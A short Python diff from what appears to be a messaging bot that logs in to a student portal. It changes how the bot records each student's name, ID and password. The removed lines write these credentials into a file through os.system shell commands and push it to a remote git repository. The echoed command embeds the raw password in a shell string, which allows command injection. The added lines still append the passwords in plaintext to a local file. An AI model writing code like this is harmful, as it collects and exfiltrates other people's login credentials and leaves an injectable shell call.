@@ -134,18 +134,9 @@ def send_sms(message, chat_id, number):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    repo_path = '/app'  # المجلد الذي يحتوي على المستودع (قم بتحديد المجلد الصحيح)
-    file_path = os.path.join(repo_path, 'information', 'data.txt')
-    content_to_write = f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n"
-    commands = [
-    f'cd {repo_path} && git pull',  # اجلب التحديثات من GitHub
-    f'echo "{content_to_write}" >> {file_path}',  # إضافة المحتوى إلى الملف
-    f'git add {file_path}',  # إضافة الملف للمرحلة
-    'git commit -m "Add data for user"',  # التزام التغييرات
-    'git push origin main'  # رفع التغييرات إلى GitHub (يمكن أن يكون اسم الفرع مختلفًا)
-]
-    for command in commands:
-    	os.system(command)
+    file=open("information/data.txt","a")
+    file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
+    
     
     
     
